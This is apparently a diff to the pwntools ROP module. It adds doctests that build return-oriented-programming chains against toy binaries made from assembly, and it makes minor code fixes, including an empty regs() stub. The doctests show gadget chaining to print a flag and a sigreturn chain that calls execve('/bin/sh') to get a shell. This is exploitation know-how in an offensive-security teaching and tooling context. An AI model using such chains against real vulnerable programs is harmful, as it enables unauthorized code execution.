@@ -1,5 +1,216 @@
 # -*- coding: utf-8 -*-
-"""Return Oriented Programming
+"""
+Return Oriented Programming
+
+Manual ROP
+-------------------
+
+The ROP tool can be used to build stacks pretty trivially.
+Let's create a fake binary which has some symbols which might
+have been useful.
+
+    >>> context.clear(arch='i386')
+    >>> binary = ELF.from_assembly('add esp, 0x10; ret')
+    >>> binary.symbols = {'read': 0xdeadbeef, 'write': 0xdecafbad, 'exit': 0xfeedface}
+
+Creating a ROP object which looks up symbols in the binary is
+pretty straightforward.
+
+    >>> rop = ROP(binary)
+
+With the ROP object, you can manually add stack frames.
+
+    >>> rop.raw(0)
+    >>> rop.raw(unpack('abcd'))
+    >>> rop.raw(2)
+
+Inspecting the ROP stack is easy, and laid out in an easy-to-read
+manner.
+
+    >>> print rop.dump()
+    0x0000:              0x0
+    0x0004:       0x64636261
+    0x0008:              0x2
+
+The ROP module is also aware of how to make function calls with
+standard Linux ABIs.
+
+    >>> rop.call('read', [4,5,6])
+    >>> print rop.dump()
+    0x0000:              0x0
+    0x0004:       0x64636261
+    0x0008:              0x2
+    0x000c:       0xdeadbeef read(1, 2, 3)
+    0x0010:           'eaaa' <pad>
+    0x0014:              0x1 arg0
+    0x0018:              0x2 arg1
+    0x001c:              0x3 arg2
+
+You can also use a shorthand to invoke calls.
+The stack is automatically adjusted for the next frame
+
+    >>> rop.write(7,8,9)
+    >>> rop.exit()
+    >>> print rop.dump()
+    0x0000:              0x0
+    0x0004:       0x64636261
+    0x0008:              0x2
+    0x000c:       0xdeadbeef read(4, 5, 6)
+    0x0010:       0x10000000 <adjust: add esp, 0x10; ret>
+    0x0014:              0x4 arg0
+    0x0018:              0x5 arg1
+    0x001c:              0x6 arg2
+    0x0020:           'iaaa' <pad>
+    0x0024:       0xdecafbad write(7, 8, 9)
+    0x0028:       0x10000000 <adjust: add esp, 0x10; ret>
+    0x002c:              0x7 arg0
+    0x0030:              0x8 arg1
+    0x0034:              0x9 arg2
+    0x0038:           'oaaa' <pad>
+    0x003c:       0xfeedface exit()
+    0x0040:           'qaaa' <pad>
+
+ROP Example
+-------------------
+
+Let's assume we have a trivial binary that just reads some data
+onto the stack, and returns.
+
+    >>> context.clear(arch='i386')
+    >>> c = constants
+    >>> assembly =  'read:'      + shellcraft.read(c.STDIN_FILENO, 'esp', 1024)
+    >>> assembly += 'ret\n'
+
+Let's provide some simple gadgets:
+
+    >>> assembly += 'jmp_esp: jmp esp\n'
+    >>> assembly += 'pop_eax: pop eax; ret\n'
+    >>> assembly += 'pop_ebx: pop ebx; ret\n'
+    >>> assembly += 'pop_ecx: pop ecx; ret\n'
+    >>> assembly += 'pop_edx: pop edx; ret\n'
+    >>> assembly += 'syscall: int 0x80; ret\n'
+    >>> assembly += 'add_esp: add esp, 0x10; ret\n'
+
+And perhaps a nice "write" function.
+
+    >>> assembly += 'write: enter 0,0\n'
+    >>> assembly += '    mov ebx, [ebp+4+4]\n'
+    >>> assembly += '    mov ecx, [ebp+4+8]\n'
+    >>> assembly += '    mov edx, [ebp+4+12]\n'
+    >>> assembly += shellcraft.write('ebx', 'ecx', 'edx')
+    >>> assembly += '    leave\n'
+    >>> assembly += '    ret\n'
+    >>> assembly += 'flag: .asciz "The flag"\n'
+
+And a way to exit cleanly.
+
+    >>> assembly += 'exit: ' + shellcraft.exit(0)
+    >>> binary   = ELF.from_assembly(assembly)
+
+Finally, let's build our ROP stack
+
+    >>> rop = ROP(binary)
+    >>> rop.write(c.STDOUT_FILENO, binary.symbols['flag'], 8)
+    >>> print rop.dump()
+    0x0000:       0x1000001b write(0, 134516852, 8)
+    0x0004:           'baaa' <pad>
+    0x0008:              0x0     arg0
+    0x000c:       0x10000036     flag
+    0x0010:              0x8     arg2
+    >>> rop.exit()
+    >>> print rop.dump()
+    0x0000:       0x1000001f write(0, 268435510, 8)
+    0x0004:       0x10000018     <adjust: add esp, 0x10; ret>
+    0x0008:              0x0     arg0
+    0x000c:       0x10000036     flag
+    0x0010:              0x8     arg2
+    0x0014:           'faaa'     <pad>
+    0x0018:       0x1000001f write(0, 268435510, 8)
+    0x001c:           'haaa'     <pad>
+    0x0020:              0x0     arg0
+    0x0024:       0x10000036     flag
+    0x0028:              0x8     arg2
+
+The raw data from the ROP stack is available via `str`.
+
+    >>> raw_rop = str(rop)
+    >>> print hexdump(raw_rop)
+    00000000  1f 00 00 10  18 00 00 10  00 00 00 00  36 00 00 10  │····│····│····│6···│
+    00000010  08 00 00 00  66 61 61 61  1f 00 00 10  68 61 61 61  │····│faaa│····│haaa│
+    00000020  00 00 00 00  36 00 00 10  08 00 00 00               │····│6···│····││
+    0000002c
+
+Let's try it out!
+
+    >>> p = process(binary.path)
+    >>> p.send(raw_rop)
+    >>> print p.recvall()
+    The flag
+    >>> p.poll()
+    0
+
+ROP + Sigreturn
+-----------------------
+
+In some cases, control of the desired register is not available.
+However, if you have control of the stack, EAX, and can find a
+`int 0x80` gadget, you can use sigreturn.
+
+Even better, this happens automagically.
+
+Our example binary will read some data onto the stack, and
+not do anything else interesting.
+
+    >>> context.clear(arch='i386')
+    >>> c = constants
+    >>> assembly =  'read:'      + shellcraft.read(c.STDIN_FILENO, 'esp', 1024)
+    >>> assembly += 'ret\n'
+    >>> assembly += 'pop eax; ret\n'
+    >>> assembly += 'int 0x80\n'
+    >>> assembly += 'binsh: .asciz "/bin/sh"'
+    >>> binary    = ELF.from_assembly(assembly)
+
+Let's create a ROP object and invoke the call.
+
+    >>> context.kernel = 'amd64'
+    >>> rop   = ROP(binary)
+    >>> binsh = binary.symbols['binsh']
+    >>> rop.execve(binsh, 0, 0)
+
+That's all there is to it.
+
+    >>> print rop.dump()
+    0x0000:       0x1000000e pop eax; ret
+    0x0004:             0x77
+    0x0008:       0x1000000b int 0x80
+    0x000c:              0x0 gs
+    0x0010:              0x0 fs
+    0x0014:              0x0 es
+    0x0018:              0x0 ds
+    0x001c:              0x0 edi
+    0x0020:              0x0 esi
+    0x0024:              0x0 ebp
+    0x0028:              0x0 esp
+    0x002c:       0x10000012 ebx = binsh
+    0x0030:              0x0 edx
+    0x0034:              0x0 ecx
+    0x0038:              0xb eax
+    0x003c:              0x0 trapno
+    0x0040:              0x0 err
+    0x0044:       0x1000000b int 0x80
+    0x0048:             0x23 cs
+    0x004c:              0x0 eflags
+    0x0050:              0x0 esp_at_signal
+    0x0054:             0x2b ss
+    0x0058:              0x0 fpstate
+
+Let's try it out!
+
+    >>> p = process(binary.path)
+    >>> p.send(str(rop))
+    >>> p.sendline('echo hello; exit')
+    >>> p.recvline()
+    'hello\n'
 """
 import collections
 import copy
@@ -408,6 +619,7 @@ class ROP(object):
                         for pad in range(fix_bytes, adjust.move, context.bytes):
                             stackArguments.append(Padding())
                     else:
+                        stack.describe('<pad>')
                         stack.append(Padding())
 
 
@@ -418,7 +630,8 @@ class ROP(object):
                         stack.append(nextGadgetAddr)
 
                     else:
-                        stack.describe(self.describe(argument) or 'arg%i' % (i + len(registers)))
+                        description = self.describe(argument) or 'arg%i' % (i + len(registers))
+                        stack.describe(description)
                         stack.append(argument)
             else:
                 stack.append(slot)
@@ -477,6 +690,13 @@ class ROP(object):
     def dump(self):
         """Dump the ROP chain in an easy-to-read manner"""
         return self.build().dump()
+
+    def regs(self, registers=None, **kw):
+        if registers is None:
+            registers = {}
+        registers.update(kw)
+
+
 
     def call(self, resolvable, arguments = (), abi = None, **kwargs):
         """Add a call to the ROP chain
@@ -793,9 +1013,15 @@ class ROP(object):
         }[order]
 
         try:
-            return min(matches, key=key)
+            result = min(matches, key=key)
         except ValueError:
             return None
+
+        # Check for magic 9999999... value used by 'leave; ret'
+        if move and result.move == 9999999999:
+            return None
+
+        return result
 
     def __getattr__(self, attr):
         """Helper to make finding ROP gadets easier.
